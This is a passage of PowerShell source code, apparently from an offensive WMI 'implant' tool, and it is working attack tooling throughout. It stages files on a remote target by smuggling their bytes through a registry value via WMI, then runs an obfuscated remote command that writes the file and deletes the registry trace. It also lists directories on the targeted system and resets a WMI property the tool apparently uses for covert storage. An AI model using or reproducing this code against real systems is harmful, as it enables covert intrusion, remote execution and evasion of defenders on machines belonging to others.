            Set-Content -Encoding byte -Path $Download_file_path -Value $decoded

            # Removing Registry value from remote system
            Write-Verbose "Removing registry value from remote system"

            if($Credential)
            {
                $null = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registrydownname -ComputerName $ComputerName -Credential $Credential
            }
            else
            {
                $null = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registrydownname -ComputerName $ComputerName
            }

            Write-Verbose "Done!"
        }

        elseif($Upload)
        {
            if(!$UploadFile)
            {
                $Upload_File = Read-Host "What's the full path to the file you'd like to upload? >"
                $Upload_File = $Upload_File.Trim()
            }
            else
            {
                $Upload_File = $UploadFile
            }

            if(!$UploadFilePath)
            {
                $Upload_Dir = Read-Host "What is the full path to the location you would like the file uploaded to? >"
                $Upload_Dir = $Upload_Dir.Trim()
            }
            else
            {
                $Upload_Dir = $UploadFilePath
            }

            # Read in file and base64 encode it
            Write-Verbose "Read in local file and encode it"
            $filecontents = Get-Content -Encoding byte -ReadCount 0 $Upload_File
            $filecontentencoded = [Int[]][byte[]]$filecontents -Join ','

            Write-Verbose "Writing encoded file to remote registry"
            if($Credential)
            {
                $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'SetStringValue' -ArgumentList $reghive, $regpath, $filecontentencoded, $registryupname -ComputerName $ComputerName -Credential $Credential
            }
            else
            {
                $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'SetStringValue' -ArgumentList $reghive, $regpath, $filecontentencoded, $registryupname -ComputerName $ComputerName
            }
            
            # grabs registry value and saves to disk
            Write-Verbose "Connecting to $ComputerName"
            $remote_command = '$Hive = 2147483650; $key = ''' + "$regpath'" + '; $value = ''' + "$registryupname" + '''; $out = Invoke-WmiMethod -Namespace ''root\default'' -Class ''StdRegProv'' -Name ''GetStringValue'' -ArgumentList $Hive, $key, $value; $decode = [byte[]][int[]]$out.sValue.Split('','') -Join '' ''; [byte[]] $decoded = $decode -split '' ''; Set-Content -Encoding byte -Path ' + "$Upload_Dir" + ' -Value $decoded; Remove-ItemProperty -Path ' + "'$fullregistrypath'" + ' -Name ' + "'$registryupname'"
            if($Credential)
            {
                Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -ComputerName $ComputerName -Credential $Credential -ObfuscateWithEnvVar
            }
            else
            {
                Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -ComputerName $ComputerName -ObfuscateWithEnvVar
            }

            Write-Verbose "Remote system now is copying file from WMI property and replacing it to the original value."
        }
    } # End of Process Block
    end{}
} # End of Function block

function Invoke-LSWMImplant
{
    # This function retrieves a diretory listing of all files from a user-specified directory on the targeted system
    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Credential,
        [Parameter(Mandatory = $True)]
        [string]$ComputerName,
        [Parameter(Mandatory = $False)] 
        [string]$Directory
    )

    Process
    {
        if(!$Directory)
        {
            $Directory = Read-Host "What's the full path to the directory? >"
            $Directory = $Directory.Trim()
        }

        $Drive = $Directory.Substring(0,2)
        $DirPath = $Directory.Substring(2)
        $DirPath = $DirPath.Replace("\","\\")
        if(!$DirPath.Endswith('\\'))
        {
            $DirPath += "\\"
        }
        Write-Verbose "Connecting to $ComputerName"
        $filter = "Drive='$Drive' and Path='$DirPath'"

        if($Credential)
        {
            Get-WmiObject -Class Win32_Directory -Filter $filter -ComputerName $ComputerName -Credential $Credential
            Get-WMIObject -Class CIM_Datafile -filter $filter -ComputerName $ComputerName -Credential $Credential
        }
        else
        {
            Get-WmiObject -Class Win32_Directory -Filter $filter -ComputerName $ComputerName
            Get-WMIObject -Class CIM_Datafile -filter $filter -ComputerName $ComputerName
        }
    }
    end{}
}

function Set-OriginalProperty
{
    # This function sets the DebugFilePath property to its default value
    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Credential,
        [Parameter(Mandatory = $True)]
        [string]$ComputerName
    )

    Process
    {
        $default_prop_value = "%SystemRoot%\Memory.dmp"
        # Set original WMI Property Value
        $Original_WMIProperty = Get-WmiObject -Class Win32_OSRecoveryConfiguration @PSBoundParameters
        $Original_WMIProperty.DebugFilePath = $default_prop_value
        $Original_WMIProperty.Put()
    }
    end{}
}
